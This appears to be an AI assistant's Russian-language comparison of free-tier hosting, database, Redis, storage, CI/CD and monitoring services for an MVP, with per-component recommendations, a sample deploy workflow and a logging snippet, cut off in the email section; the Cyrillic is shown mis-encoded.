 

ะัะปะธัะฝะพ! ะกะตะนัะฐั ั ะฟะพะดะณะพัะพะฒะปั **ะะะะะฃะฎ ะะะกะะะะะะฃ ะะะกะะะะขะะซะฅ ะะะจะะะะ** ะดะปั ะบะฐะถะดะพะณะพ ะบะพะผะฟะพะฝะตะฝัะฐ ะธะฝััะฐััััะบัััั ั ะดะตัะฐะปัะฝัะผ ััะฐะฒะฝะตะฝะธะตะผ ะธ ะผะพะตะน ัะตะบะพะผะตะฝะดะฐัะธะตะน.

***

# ๐ **ะะะกะะะะขะะะฏ ะะะคะะะกะขะะฃะะขะฃะะ ะะะฏ MVP/ะะะะะะะ ะะะะฃะกะะ**

## ๐ **ะะะฅะะขะะะขะฃะะ ะะะะะะะะะขะะ**

```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ                    INFRASTRUCTURE STACK                      โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโค
โ 1. ะฅะพััะธะฝะณ Backend API (NestJS)                            โ
โ 2. ะฅะพััะธะฝะณ Frontend (Next.js)                              โ
โ 3. ะะฐะทะฐ ะดะฐะฝะฝัั PostgreSQL                                   โ
โ 4. Redis (ะบัั + ะพัะตัะตะดะธ)                                    โ
โ 5. S3 Storage (ัะฐะนะปั, ะปะพะณะพัะธะฟั)                            โ
โ 6. CI/CD Pipeline                                           โ
โ 7. ะะพะฝะธัะพัะธะฝะณ + Alerting                                    โ
โ 8. ะะพะณะธัะพะฒะฐะฝะธะต                                              โ
โ 9. SSL/DNS                                                  โ
โ 10. Email Service                                           โ
โ 11. SMS Provider                                            โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```


***

## ๐ฅ๏ธ **1. ะฅะะกะขะะะ BACKEND API (NestJS + Workers)**

### **ะะฐัะธะฐะฝั A: Railway.app** โญโญโญ

**Free Tier:**

- \$5 ะฑะตัะฟะปะฐัะฝัั ะบัะตะดะธัะพะฒ ะฒ ะผะตััั (ัะฒะฐัะธั ะฝะฐ ~500 ัะฐัะพะฒ ัะฐะฑะพัั ะผะฐะปะตะฝัะบะพะณะพ ะธะฝััะฐะฝัะฐ)
- 512 MB RAM, 1 vCPU
- Unlimited bandwidth
- 1 GB storage

**ะะปััั:**

- โ ะะฒัะพะดะตะฟะปะพะน ะธะท GitHub
- โ ะัััะพะตะฝะฝัะน PostgreSQL + Redis (ัะพะถะต ะฑะตัะฟะปะฐัะฝะพ)
- โ Environment variables management
- โ ะะพะณะธ ะฒ ัะตะฐะปัะฝะพะผ ะฒัะตะผะตะฝะธ
- โ ะัะพััะพะน UI
- โ Rollback ะทะฐ 1 ะบะปะธะบ
- โ Custom domains + ะฑะตัะฟะปะฐัะฝัะน SSL

**ะะธะฝััั:**

- โ \$5/ะผะตััั ัะฒะฐัะธั ัะพะปัะบะพ ะฝะฐ ะพะดะธะฝ ัะตัะฒะธั (ะปะธะฑะพ backend, ะปะธะฑะพ worker)
- โ ะะพัะปะต ะธะทัะฐััะพะดะพะฒะฐะฝะธั ะบัะตะดะธัะพะฒ - ะฟะปะฐัะฝะพ (\$0.000231/GB-second)
- โ ะะตั ะฐะฒัะพัะบะตะนะปะธะฝะณะฐ ะฝะฐ free tier

**ะะพะดัะพะดะธั ะดะปั:** MVP ั ะฝะธะทะบะธะผ ััะฐัะธะบะพะผ (ะดะพ 1000 ะฟะพะปัะทะพะฒะฐัะตะปะตะน)

***

### **ะะฐัะธะฐะฝั B: Render.com** โญโญโญโญ

**Free Tier:**

- Unlimited ะฒะตะฑ-ัะตัะฒะธัั (ะฝะพ ัะฟัั ะฟะพัะปะต 15 ะผะธะฝัั ะฝะตะฐะบัะธะฒะฝะพััะธ)
- 512 MB RAM, 0.1 CPU
- 100 GB bandwidth/ะผะตััั
- PostgreSQL (90 ะดะฝะตะน, ะฟะพัะพะผ ัะดะฐะปัะตััั)
- Redis (90 ะดะฝะตะน)

**ะะปััั:**

- โ **ะะพะปะฝะพัััั ะฑะตัะฟะปะฐัะฝัะน** (ะฝะต ััะตะฑัะตั ะบะฐััั)
- โ ะะฒัะพะดะตะฟะปะพะน ะธะท GitHub/GitLab
- โ ะัััะพะตะฝะฝัะน PostgreSQL + Redis
- โ Custom domains + Auto SSL
- โ Health checks
- โ Simple Dockerfile deployment
- โ Environment groups
- โ Preview environments (ะดะปั PR)

**ะะธะฝััั:**

- โ **ะกะฟะธั ะฟะพัะปะต 15 ะผะธะฝัั ะฝะตะฐะบัะธะฒะฝะพััะธ** (cold start 30-60 ัะตะบ)
- โ PostgreSQL ัะดะฐะปัะตััั ัะตัะตะท 90 ะดะฝะตะน (ะฝัะถะฝะพ ะฑัะบะฐะฟะธัั)
- โ ะะธะทะบะฐั ะฟัะพะธะทะฒะพะดะธัะตะปัะฝะพััั (0.1 CPU)

**ะะพะดัะพะดะธั ะดะปั:** MVP, ัะตััะธัะพะฒะฐะฝะธะต, ะดะตะผะพ

***

### **ะะฐัะธะฐะฝั C: Fly.io** โญโญโญโญโญ

**Free Tier:**

- ะะพ 3 shared-cpu VMs (256 MB RAM ะบะฐะถะดะฐั)
- 160 GB bandwidth/ะผะตััั
- PostgreSQL (3 GB storage, 1 instance)
- Redis ัะตัะตะท Upstash (ัะผ. ะฝะธะถะต)

**ะะปััั:**

- โ **ะะ ะกะะะข** (always-on ะฒ ะพัะปะธัะธะต ะพั Render)
- โ ะะปะพะฑะฐะปัะฝะฐั CDN (deploy ะฑะปะธะทะบะพ ะบ ะฟะพะปัะทะพะฒะฐัะตะปัะผ)
- โ 3 VM = ะผะพะถะฝะพ Backend + Worker + Cron ะพัะดะตะปัะฝะพ
- โ Dockerfile deployment
- โ Zero-downtime deploys
- โ Logs \& metrics ะฒัััะพะตะฝะฝัะต
- โ Auto SSL
- โ ะะต ััะตะฑัะตั ะบะฐััั ะดะปั ะฝะฐัะฐะปะฐ

**ะะธะฝััั:**

- โ 256 MB RAM ะผะฐะปะพะฒะฐัะพ (ะฝัะถะฝะพ ะพะฟัะธะผะธะทะธัะพะฒะฐัั ะฟัะธะปะพะถะตะฝะธะต)
- โ PostgreSQL ัะพะปัะบะพ 3 GB storage
- โ ะกะปะพะถะฝะตะต ะฝะฐัััะพะธัั ัะตะผ Render

**ะะพะดัะพะดะธั ะดะปั:** Production MVP ั ัะตะฐะปัะฝัะผะธ ะฟะพะปัะทะพะฒะฐัะตะปัะผะธ

***

### **ะะฐัะธะฐะฝั D: Google Cloud Run** โญโญโญ

**Free Tier:**

- 2 ะผะธะปะปะธะพะฝะฐ ะทะฐะฟัะพัะพะฒ/ะผะตััั
- 360,000 GB-seconds RAM
- 180,000 vCPU-seconds
- Always Free (ะฝะต ะธััะตะบะฐะตั)

**ะะปััั:**

- โ **ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ** (Always Free tier)
- โ ะะฒัะพัะบะตะนะปะธะฝะณ (0 โ N ะธะฝััะฐะฝัะพะฒ)
- โ Pay-per-request (ะฟะปะฐัะธัั ัะพะปัะบะพ ะทะฐ ะธัะฟะพะปัะทะพะฒะฐะฝะธะต)
- โ ะัะตะฝั ะฑัััััะน cold start (< 1 ัะตะบ)
- โ Google infrastructure

**ะะธะฝััั:**

- โ ะขัะตะฑัะตั GCP ะฐะบะบะฐัะฝั (ะฝัะถะฝะฐ ะบะฐััะฐ ะดะปั ะฒะตัะธัะธะบะฐัะธะธ, ะฝะพ ะฝะต ัะฟะธััั)
- โ ะกะปะพะถะฝะตะต ะฝะฐัััะพะธัั ัะตะผ Railway/Render
- โ PostgreSQL ะธ Redis ะพัะดะตะปัะฝะพ (ะฝัะถะฝั ะดััะณะธะต ัะตัะฒะธัั)

**ะะพะดัะพะดะธั ะดะปั:** Serverless ะฐััะธัะตะบัััะฐ, low-traffic MVP

***

### **ะะฐัะธะฐะฝั E: Self-hosted ะฝะฐ ะฑะตัะฟะปะฐัะฝะพะผ VPS**

**Oracle Cloud Always Free Tier:**

- 2 VM instances (1 GB RAM, 1/8 OCPU ะบะฐะถะดะฐั)
- 200 GB storage
- 10 TB bandwidth/ะผะตััั
- **ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ**

**ะะปััั:**

- โ ะะพะปะฝัะน ะบะพะฝััะพะปั
- โ 2 VM = ะผะพะถะฝะพ Backend + Worker/DB ะพัะดะตะปัะฝะพ
- โ 200 GB storage (ะผะพะถะฝะพ PostgreSQL + Redis + ัะฐะนะปั)
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ (ะฝะต ะธััะตะบะฐะตั)

**ะะธะฝััั:**

- โ ะัะถะฝะพ ะฝะฐัััะฐะธะฒะฐัั ะฒัั ะฒัััะฝัั (Docker, Nginx, SSL, backups)
- โ ะขัะตะฑัะตั DevOps ะฝะฐะฒัะบะพะฒ
- โ ะะตั ะฐะฒัะพะดะตะฟะปะพั (ะฝัะถะฝะพ ะฝะฐัััะพะธัั CI/CD)
- โ Maintenance ะฝะฐ ัะตะฑะต

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ะตััั ะพะฟัั DevOps ะธ ัะพัะตัั ะบะพะฝััะพะปั

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ BACKEND: Fly.io**

**ะะพัะตะผั:**

1. โ **ะะ ะกะะะข** (ะบัะธัะธัะฝะพ ะดะปั Telegram ะฑะพัะฐ ะธ POS webhooks)
2. โ 3 VM = Backend + Worker + Cron jobs ะพัะดะตะปัะฝะพ
3. โ PostgreSQL ะฒัััะพะตะฝ (3 GB ัะฒะฐัะธั ะฝะฐ ะฟะตัะฒัะต 1000+ ะณะพััะตะน)
4. โ ะัะพััะพะน ะดะตะฟะปะพะน (`fly deploy`)
5. โ Zero-downtime updates

**ะััะธัะตะบัััะฐ ะฝะฐ Fly.io:**

```
โโโโโโโโโโโโโโโ     โโโโโโโโโโโโโโโ     โโโโโโโโโโโโโโโ
โ   Backend   โ     โ   Worker    โ     โ  Cron Jobs  โ
โ  (256 MB)   โโโโโโถโ  (256 MB)   โโโโโโถโ  (256 MB)   โ
โ  NestJS API โ     โ  BullMQ     โ     โ  Daily Jobs โ
โโโโโโโโโโโโโโโ     โโโโโโโโโโโโโโโ     โโโโโโโโโโโโโโโ
       โ                    โ                    โ
       โโโโโโโโโโโโโโโโโโโโโโดโโโโโโโโโโโโโโโโโโโโโ
                           โ
                  โโโโโโโโโโผโโโโโโโโโ
                  โ  PostgreSQL     โ
                  โ  (3 GB)         โ
                  โโโโโโโโโโโโโโโโโโโ
```


***

## ๐ **2. ะฅะะกะขะะะ FRONTEND (Next.js Admin Panel)**

### **ะะฐัะธะฐะฝั A: Vercel** โญโญโญโญโญ

**Free Tier (Hobby):**

- Unlimited deployments
- 100 GB bandwidth/ะผะตััั
- Serverless functions (100 GB-hours)
- Preview deployments ะดะปั ะบะฐะถะดะพะณะพ PR
- Auto SSL

**ะะปััั:**

- โ **ะกะพะทะดะฐัะตะปะธ Next.js** (ะธะดะตะฐะปัะฝะฐั ะธะฝัะตะณัะฐัะธั)
- โ ะะฒัะพะดะตะฟะปะพะน ะธะท GitHub
- โ Edge network (CDN)
- โ Preview URLs ะดะปั ะบะฐะถะดะพะณะพ PR
- โ Environment variables
- โ Zero config (ะฟัะพััะพ `git push`)
- โ ะะตัะฟะปะฐัะฝัะน ะดะพะผะตะฝ `*.vercel.app`

**ะะธะฝััั:**

- โ 100 GB bandwidth ะผะพะถะตั ะฝะต ัะฒะฐัะธัั (ะฝะพ ะดะปั ะฐะดะผะธะฝะบะธ ัะฒะฐัะธั)
- โ ะะตะปัะทั commercial use ะฝะฐ Hobby (ะฝะพ ะดะปั MVP ัะตัะฟะธะผะพ)

**ะะพะดัะพะดะธั ะดะปั:** Next.js frontend - ะปัััะธะน ะฒัะฑะพั

***

### **ะะฐัะธะฐะฝั B: Netlify** โญโญโญโญ

**Free Tier:**

- 100 GB bandwidth/ะผะตััั
- 300 build minutes/ะผะตััั
- Preview deployments
- Auto SSL

**ะะปััั:**

- โ ะัะพััะพะน ะดะตะฟะปะพะน
- โ ะฅะพัะพัะธะน UI
- โ Forms + Functions ะฒัััะพะตะฝะฝัะต

**ะะธะฝััั:**

- โ ะะตะดะปะตะฝะฝะตะต ัะตะผ Vercel ะดะปั Next.js
- โ ะะตะฝััะต ัะธั ะดะปั Next.js

**ะะพะดัะพะดะธั ะดะปั:** ะะปััะตัะฝะฐัะธะฒะฐ Vercel

***

### **ะะฐัะธะฐะฝั C: Cloudflare Pages** โญโญโญโญ

**Free Tier:**

- Unlimited bandwidth
- Unlimited requests
- 500 builds/ะผะตััั

**ะะปััั:**

- โ **Unlimited bandwidth** (ะปัััะธะน free tier)
- โ Cloudflare CDN (ะพัะตะฝั ะฑััััะพ)
- โ Workers ะดะปั serverless functions

**ะะธะฝััั:**

- โ ะกะปะพะถะฝะตะต ะฝะฐัััะพะธัั Next.js ัะตะผ ะฝะฐ Vercel
- โ ะะต ะฒัะต Next.js ัะธัะธ ัะฐะฑะพัะฐัั

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ะฝัะถะตะฝ unlimited bandwidth

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ FRONTEND: Vercel**

**ะะพัะตะผั:**

- โ Next.js ัะพะทะดะฐะฝ Vercel (ะฝะฐัะธะฒะฝะฐั ะฟะพะดะดะตัะถะบะฐ)
- โ Zero config
- โ Preview deployments ะดะปั ะบะฐะถะดะพะณะพ PR (ัะดะพะฑะฝะพ ะดะปั ัะตััะธัะพะฒะฐะฝะธั)
- โ 100 GB bandwidth ัะฒะฐัะธั ะดะปั ะฐะดะผะธะฝะบะธ

***

## ๐๏ธ **3. POSTGRESQL DATABASE**

### **ะะฐัะธะฐะฝั A: Supabase** โญโญโญโญโญ

**Free Tier:**

- 500 MB database storage
- Unlimited API requests
- 50,000 monthly active users
- 2 GB bandwidth
- Auto backups (7 ะดะฝะตะน)
- PostgreSQL 15

**ะะปััั:**

- โ **ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ**
- โ Realtime subscriptions (ะผะพะถะฝะพ ะธัะฟะพะปัะทะพะฒะฐัั)
- โ Built-in Auth (ะฝะพ ะผั ัะฒะพะน)
- โ Auto API generation (REST + GraphQL)
- โ Backups ะฐะฒัะพะผะฐัะธัะตัะบะธะต
- โ Connection pooling
- โ Extensions (pgvector, PostGIS)

**ะะธะฝััั:**

- โ 500 MB storage (ะผะพะถะตั ะฝะต ัะฒะฐัะธัั ะฟัะธ ัะพััะต)
- โ ะัะพะตะบั ะทะฐััะฟะฐะตั ะฟะพัะปะต 7 ะดะฝะตะน ะฝะตะฐะบัะธะฒะฝะพััะธ (ะฝะพ ะดะปั DB ััะพ ะฝะพัะผ)

**ะะพะดัะพะดะธั ะดะปั:** MVP ะดะพ 5000 ะณะพััะตะน

***

### **ะะฐัะธะฐะฝั B: Neon.tech** โญโญโญโญโญ

**Free Tier:**

- 3 GB storage (ะฑะพะปััะต ัะตะผ Supabase!)
- 0.5 GB RAM
- Unlimited databases
- Autoscaling (ะฒะบะปััะฐั ะดะพ 0)
- Branching (ะบะฐะบ git ะดะปั ะะ)

**ะะปััั:**

- โ **3 GB storage** (ะฒ 6 ัะฐะท ะฑะพะปััะต Supabase)
- โ Database branching (ะผะพะถะฝะพ ัะพะทะดะฐะฒะฐัั ะบะพะฟะธะธ ะดะปั ัะตััะพะฒ)
- โ Autoscaling ะดะพ 0 (ะฝะต ะฟะปะฐัะธัั ะบะพะณะดะฐ ะฝะต ะธัะฟะพะปัะทัะตัั)
- โ Connection pooling
- โ Instant backups

**ะะธะฝััั:**

- โ ะัะพะตะบั ัะดะฐะปัะตััั ะฟะพัะปะต 7 ะดะฝะตะน ะฝะตะฐะบัะธะฒะฝะพััะธ ะฝะฐ free tier
- โ ะัะถะฝะพ ะฟะตัะธะพะดะธัะตัะบะธ "ะฟะธะฝะณะฐัั" ััะพะฑั ะฝะต ัะดะฐะปะธะปะธ

**ะะพะดัะพะดะธั ะดะปั:** MVP ั database branching ะดะปั ัะตััะพะฒ

***

### **ะะฐัะธะฐะฝั C: ElephantSQL** โญโญโญ

**Free Tier (Tiny Turtle):**

- 20 MB storage
- 5 concurrent connections

**ะะปััั:**

- โ ะัะพััะพะน
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะธะฝััั:**

- โ **20 MB ัะปะธัะบะพะผ ะผะฐะปะพ** (ัะฒะฐัะธั ะฝะฐ 100 ะณะพััะตะน)
- โ 5 connections ะผะฐะปะพ

**ะะพะดัะพะดะธั ะดะปั:** ะขะพะปัะบะพ ะดะปั ะฟัะพัะพัะธะฟะฐ

***

### **ะะฐัะธะฐะฝั D: Fly.io PostgreSQL** โญโญโญโญ

**Free Tier:**

- 3 GB storage
- 1 instance (256 MB RAM)
- Auto backups

**ะะปััั:**

- โ 3 GB storage
- โ ะะฝัะตะณัะฐัะธั ั Fly.io backend (ะฝะธะทะบะฐั latency)
- โ ะะฐััะพััะธะน PostgreSQL (ะฝะต managed)

**ะะธะฝััั:**

- โ 256 MB RAM ะผะฐะปะพะฒะฐัะพ ะดะปั ะฑะพะปััะพะน ะฝะฐะณััะทะบะธ
- โ Backups ะฝัะถะฝะพ ะฝะฐัััะพะธัั ัะฐะผะพะผั

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ backend ัะพะถะต ะฝะฐ Fly.io

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ POSTGRESQL: Neon.tech**

**ะะพัะตะผั:**

- โ **3 GB storage** (ัะฒะฐัะธั ะฝะฐ 10,000+ ะณะพััะตะน ั ะธััะพัะธะตะน)
- โ **Database branching** (ะผะพะถะฝะพ ัะพะทะดะฐัั ะฒะตัะบั ะดะปั ัะตััะธัะพะฒะฐะฝะธั ะฝะพะฒัั ัะธั)
- โ Connection pooling (ะฒะฐะถะฝะพ ะดะปั NestJS)
- โ Autoscaling

**ะะฐัััั storage:**

```
ะะพััั: ~2 KB (ะฟัะพัะธะปั + ะบะฐััะฐ)
ะขัะฐะฝะทะฐะบัะธั: ~500 bytes
1000 ะณะพััะตะน ร 2 KB = 2 MB
1000 ะณะพััะตะน ร 10 ััะฐะฝะทะฐะบัะธะน ร 500 bytes = 5 MB
ะะขะะะ ะฝะฐ 1000 ะณะพััะตะน: ~20-30 MB ั ะธะฝะดะตะบัะฐะผะธ

3 GB ัะฒะฐัะธั ะฝะฐ ~10,000 ะณะพััะตะน ั ะฟะพะปะฝะพะน ะธััะพัะธะตะน
```


***

## ๐ด **4. REDIS (ะัั + ะัะตัะตะดะธ + Rate Limiting)**

### **ะะฐัะธะฐะฝั A: Upstash** โญโญโญโญโญ

**Free Tier:**

- 10,000 commands/ะดะตะฝั
- 256 MB storage
- Global read replicas
- TLS encryption

**ะะปััั:**

- โ **Serverless Redis** (pay-per-request)
- โ 10,000 commands ัะฒะฐัะธั ะดะปั MVP
- โ Global replicas (ะฝะธะทะบะฐั latency)
- โ REST API (ะผะพะถะฝะพ ะธัะฟะพะปัะทะพะฒะฐัั ะฑะตะท Redis client)
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะธะฝััั:**

- โ 10,000 commands/ะดะตะฝั ะผะพะถะตั ะฝะต ัะฒะฐัะธัั ะฟัะธ ัะพััะต
- โ 256 MB storage ะผะฐะปะพะฒะฐัะพ ะดะปั ะฑะพะปััะธั ะพัะตัะตะดะตะน

**ะะพะดัะพะดะธั ะดะปั:** MVP ะดะพ 1000 ะฐะบัะธะฒะฝัั ะฟะพะปัะทะพะฒะฐัะตะปะตะน/ะดะตะฝั

***

### **ะะฐัะธะฐะฝั B: Redis Cloud (Redis Labs)** โญโญโญโญ

**Free Tier:**

- 30 MB storage
- 30 connections
- High availability

**ะะปััั:**

- โ ะัะธัะธะฐะปัะฝัะน Redis
- โ High availability
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะธะฝััั:**

- โ **30 MB ะพัะตะฝั ะผะฐะปะพ**
- โ 30 connections ะผะพะถะตั ะฝะต ัะฒะฐัะธัั

**ะะพะดัะพะดะธั ะดะปั:** ะขะพะปัะบะพ ะดะปั ะบััะฐ (ะฝะต ะดะปั ะพัะตัะตะดะตะน)

***

### **ะะฐัะธะฐะฝั C: Render.com Redis** โญโญโญ

**Free Tier:**

- 25 MB storage
- 90 ะดะฝะตะน ะฑะตัะฟะปะฐัะฝะพ (ะฟะพัะพะผ ัะดะฐะปัะตััั)

**ะะปััั:**

- โ ะะฝัะตะณัะฐัะธั ั Render backend

**ะะธะฝััั:**

- โ 25 MB ะผะฐะปะพ
- โ **ะฃะดะฐะปัะตััั ัะตัะตะท 90 ะดะฝะตะน**

**ะะพะดัะพะดะธั ะดะปั:** ะขะพะปัะบะพ ะดะปั ัะตััะธัะพะฒะฐะฝะธั

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ REDIS: Upstash**

**ะะพัะตะผั:**

- โ 10,000 commands/ะดะตะฝั ัะฒะฐัะธั ะดะปั MVP
- โ Serverless (ะฟะปะฐัะธัั ัะพะปัะบะพ ะทะฐ ะธัะฟะพะปัะทะพะฒะฐะฝะธะต)
- โ Global replicas (ัะฐะฑะพัะฐะตั ั Fly.io/Vercel)
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะฐัััั ะธัะฟะพะปัะทะพะฒะฐะฝะธั:**

```
Rate limiting: ~100 requests/ะดะตะฝั
Session cache: ~50 reads/ะดะตะฝั
Queue operations: ~200/ะดะตะฝั
ะะขะะะ: ~500 commands/ะดะตะฝั (ะฒ 20 ัะฐะท ะผะตะฝััะต ะปะธะผะธัะฐ)
```


***

## ๐ฆ **5. S3 STORAGE (ะคะฐะนะปั, ะะพะณะพัะธะฟั, ะะฒะฐัะฐัั)**

### **ะะฐัะธะฐะฝั A: Cloudflare R2** โญโญโญโญโญ

**Free Tier:**

- 10 GB storage/ะผะตััั
- 1 ะผะธะปะปะธะพะฝ Class A ะพะฟะตัะฐัะธะน (PUT, LIST)
- 10 ะผะธะปะปะธะพะฝะพะฒ Class B ะพะฟะตัะฐัะธะน (GET, HEAD)
- **Unlimited bandwidth** (egress free!)

**ะะปััั:**

- โ **Unlimited bandwidth** (ะณะปะฐะฒะฝะพะต ะฟัะตะธะผััะตััะฒะพ vs AWS S3)
- โ 10 GB ัะฒะฐัะธั ะฝะฐ ัััััะธ ะปะพะณะพัะธะฟะพะฒ
- โ S3-compatible API (ะปะตะณะบะพ ะผะธะณัะธัะพะฒะฐัั)
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะธะฝััั:**

- โ ะขัะตะฑัะตั ะฐะบะบะฐัะฝั Cloudflare

**ะะพะดัะพะดะธั ะดะปั:** Production MVP

***

### **ะะฐัะธะฐะฝั B: Backblaze B2** โญโญโญโญ

**Free Tier:**

- 10 GB storage
- 1 GB download/ะดะตะฝั
- Unlimited uploads

**ะะปััั:**

- โ 10 GB storage
- โ S3-compatible
- โ ะะตัะตะฒะปะต AWS

**ะะธะฝััั:**

- โ 1 GB download/ะดะตะฝั ะผะพะถะตั ะฝะต ัะฒะฐัะธัั

**ะะพะดัะพะดะธั ะดะปั:** ะะปััะตัะฝะฐัะธะฒะฐ R2

***

### **ะะฐัะธะฐะฝั C: Supabase Storage** โญโญโญโญ

**Free Tier:**

- 1 GB storage
- 2 GB bandwidth/ะผะตััั

**ะะปััั:**

- โ ะะฝัะตะณัะฐัะธั ั Supabase DB
- โ CDN included
- โ Image resizing on-the-fly

**ะะธะฝััั:**

- โ 1 GB ะผะฐะปะพ
- โ 2 GB bandwidth ะผะฐะปะพ

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ัะถะต ะธัะฟะพะปัะทัะตัั Supabase DB

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ STORAGE: Cloudflare R2**

**ะะพัะตะผั:**

- โ **Unlimited bandwidth** (ะบัะธัะธัะฝะพ ะดะปั ะทะฐะณััะทะบะธ ะปะพะณะพัะธะฟะพะฒ/ะฐะฒะฐัะฐัะพะฒ)
- โ 10 GB ัะฒะฐัะธั ะฝะฐ 10,000+ ะธะทะพะฑัะฐะถะตะฝะธะน
- โ S3-compatible (ะปะตะณะบะพ ัะผะตะฝะธัั ะฟัะพะฒะฐะนะดะตัะฐ)

***

## ๐ **6. CI/CD PIPELINE**

### **ะะฐัะธะฐะฝั A: GitHub Actions** โญโญโญโญโญ

**Free Tier:**

- 2,000 minutes/ะผะตััั (public repos)
- 500 MB storage (artifacts)
- Linux/Windows/macOS runners

**ะะปััั:**

- โ **ะัััะพะตะฝ ะฒ GitHub**
- โ 2,000 ะผะธะฝัั ัะฒะฐัะธั ะฝะฐ ~100 ะดะตะฟะปะพะตะฒ
- โ ะะณัะพะผะฝัะน marketplace actions
- โ Matrix builds (ัะตััะธััะน ะฝะฐ ัะฐะทะฝัั ะฒะตััะธัั Node)
- โ Secrets management

**ะะธะฝััั:**

- โ 2,000 ะผะธะฝัั ะผะพะถะตั ะฝะต ัะฒะฐัะธัั ะดะปั ะฑะพะปััะธั ัะตััะพะฒ

**ะะพะดัะพะดะธั ะดะปั:** ะัะฑะพะน ะฟัะพะตะบั ะฝะฐ GitHub

***

### **ะะฐัะธะฐะฝั B: GitLab CI/CD** โญโญโญโญ

**Free Tier:**

- 400 minutes/ะผะตััั
- Shared runners

**ะะปััั:**

- โ ะัััะพะตะฝ ะฒ GitLab
- โ Docker registry included

**ะะธะฝััั:**

- โ 400 ะผะธะฝัั ะผะตะฝััะต ัะตะผ GitHub

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ะธัะฟะพะปัะทัะตัั GitLab

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ CI/CD: GitHub Actions**

**ะะพัะตะผั:**

- โ 2,000 ะผะธะฝัั/ะผะตััั
- โ ะััะผะฐั ะธะฝัะตะณัะฐัะธั ั Fly.io/Vercel/Render
- โ ะะณัะพะผะฝะพะต ะบะพะผััะฝะธัะธ

**ะัะธะผะตั workflow:**

```yaml
name: Deploy
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: superfly/flyctl-actions@v1
        with:
          args: deploy
```


***

## ๐ **7. ะะะะะขะะะะะ + ALERTING**

### **ะะฐัะธะฐะฝั A: Better Stack (formerly Logtail)** โญโญโญโญโญ

**Free Tier:**

- 1 GB logs/ะผะตััั
- 10 monitors (uptime checks)
- 1,000 incidents/ะผะตััั
- Unlimited team members

**ะะปััั:**

- โ **ะัั ะฒ ะพะดะฝะพะผ** (logs + uptime + incidents)
- โ ะัะฐัะธะฒัะน UI
- โ Telegram/Slack notifications
- โ 10 uptime monitors (ะฟัะพะฒะตััะน Backend, Frontend, DB)

**ะะธะฝััั:**

- โ 1 GB logs ะผะพะถะตั ะฝะต ัะฒะฐัะธัั

**ะะพะดัะพะดะธั ะดะปั:** Production MVP

***

### **ะะฐัะธะฐะฝั B: UptimeRobot** โญโญโญโญ

**Free Tier:**

- 50 monitors
- 5-minute checks
- Email/Slack/Telegram alerts

**ะะปััั:**

- โ **50 monitors** (ะพัะตะฝั ะผะฝะพะณะพ)
- โ ะัะพััะพะน
- โ ะะฐะฒัะตะณะดะฐ ะฑะตัะฟะปะฐัะฝะพ

**ะะธะฝััั:**

- โ ะขะพะปัะบะพ uptime monitoring (ะฝะตั ะปะพะณะพะฒ)
- โ 5-minute checks (ะฝะต real-time)

**ะะพะดัะพะดะธั ะดะปั:** ะะฐะทะพะฒัะน uptime monitoring

***

### **ะะฐัะธะฐะฝั C: Grafana Cloud** โญโญโญโญ

**Free Tier:**

- 10,000 series metrics
- 50 GB logs
- 50 GB traces
- 14-day retention

**ะะปััั:**

- โ Professional monitoring
- โ 50 GB logs (ะฑะพะปััะต ะฒัะตั)
- โ Grafana dashboards

**ะะธะฝััั:**

- โ ะกะปะพะถะฝะตะต ะฝะฐัััะพะธัั
- โ ะัะถะฝะพ ะธะฝัะตะณัะธัะพะฒะฐัั Prometheus exporter

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ะทะฝะฐะตัั Grafana

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ ะะะะะขะะะะะะ: Better Stack**

**ะะพัะตะผั:**

- โ ะัั ะฒ ะพะดะฝะพะผ (ะปะพะณะธ + uptime + ะฐะปะตััั)
- โ ะัะพััะพะน setup
- โ Telegram notifications (ะบัะธัะธัะฝะพ ะดะปั ัะตะฑั)

**Setup:**

```typescript
// Winston transport ะดะปั Better Stack
import { createLogger, transports } from 'winston'
import { Logtail } from '@logtail/node'
import { LogtailTransport } from '@logtail/winston'

const logtail = new Logtail(process.env.LOGTAIL_TOKEN)

export const logger = createLogger({
  transports: [
    new LogtailTransport(logtail)
  ]
})
```


***

## ๐ง **10. EMAIL SERVICE**

### **ะะฐัะธะฐะฝั A: Resend** โญโญโญโญโญ

**Free Tier:**

- 3,000 emails/ะผะตััั
- 100 emails/ะดะตะฝั
- Email API + SMTP
- Webhooks (bounce, open, click tracking)

**ะะปััั:**

